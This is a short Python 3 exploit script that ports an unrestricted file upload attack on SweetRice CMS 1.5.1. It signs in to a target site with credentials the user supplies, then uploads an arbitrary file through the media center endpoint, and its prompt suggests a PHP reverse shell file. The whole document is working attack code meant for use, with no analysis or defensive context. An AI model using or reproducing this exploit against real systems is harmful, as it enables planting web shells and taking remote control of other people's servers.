#!/usr/bin/python3
#SweetRice CMS 1.5.1 - Unrestricted File Upload  
#python3 port of the exploit 
#Author George Sotiriadis
import requests

HOST = input("Enter The Target HOST(Example : locahost.gr) : ")
username = input("Enter Username : ")
password = input("Enter Password : ")

FILE=input("Enter a file name to upload Example, php-reverse-shell.php6:  ")

UPLOAD_URL='http://' + HOST + '/content/as/?type=media_center&mode=upload'

LOGIN_URL = 'http://' + HOST  + '/content/as/?type=signin'

credentials = {
    'user': username,
    'passwd' : password

}


with requests.Session() as session:
    post = session.post(LOGIN_URL, data=credentials)
    success = 'Login success'
    if post.status_code == 200:
        print("[+] Sending Credentials...")
        if post.text.find(success) > 1:
            print("[+] Login Successfully...")
           
        else:
            print("[-] Username or Password is incorrent.")
            print("Exiting...")
            exit()
            pass
        pass
    files= {'upload[]':(open(FILE, 'rb') )}
    r=session.post(UPLOAD_URL,files=files)
    if r.status_code == 200:
        print("[+] File uploaded succesessfully")
    else:
        print("File upload failed")

